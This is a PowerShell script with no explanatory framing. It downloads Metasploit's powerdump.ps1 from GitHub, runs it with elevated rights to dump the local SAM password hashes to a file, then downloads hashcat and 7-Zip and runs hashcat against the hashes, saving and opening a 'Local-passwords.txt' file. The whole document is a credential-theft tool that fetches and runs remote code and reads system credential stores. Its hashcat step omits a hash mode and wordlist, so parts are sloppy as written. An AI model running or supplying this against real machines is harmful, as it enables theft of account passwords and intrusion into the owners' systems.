# This must run with elevated privileges
# Download powerdump
curl "https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/powershell/powerdump.ps1" -OutFile "$env:TEMP\powerdump.ps1"

$startInfo = New-Object System.Diagnostics.ProcessStartInfo
$startInfo.FileName = "powershell.exe"
$startInfo.Arguments = "$env:TEMP\powerdump.ps1"
$startInfo.RedirectStandardOutput = $true
$startInfo.UseShellExecute = $false
$startInfo.CreateNoWindow = $false
#$startInfo.Username = "DOMAIN\Username"
#$startInfo.Password = $password
$process = New-Object System.Diagnostics.Process
$process.StartInfo = $startInfo
$process.Start() | Out-Null
$standardOut = $process.StandardOutput.ReadToEnd()
$process.WaitForExit()

# $standardOut should contain the results of powerdump
clear 
$standardOut
$standardOut | Out-File ".\localSAM"  -Encoding utf8 -ErrorAction Ignore


# Download HashCat for Windows

curl "https://hashcat.net/files/hashcat-3.6.0.7z" -OutFile "hashcat-3.6.0.7z"
$7z = test-path "$env:ProgramFiles\7-Zip\7z.exe"
if ($7z -eq $false){ curl "http://7-zip.org/a/7z1700-x64.exe" -OutFile .\7z.exe; Invoke-Item .\7z.exe }
7za x hashcat-3.6.0.7z

$Crack = ".\hashcat-3.6.0\hashcat64.exe"
$CrackParams = @('localSAM') 
$Prms = $CrackParams.Split(" ")
$Passwords = & $Crack "localSAM"
$Passwords | Out-File "Local-passwords.txt" -Encoding utf8 -ErrorAction Ignore
Invoke-Item "Local-passwords.txt"
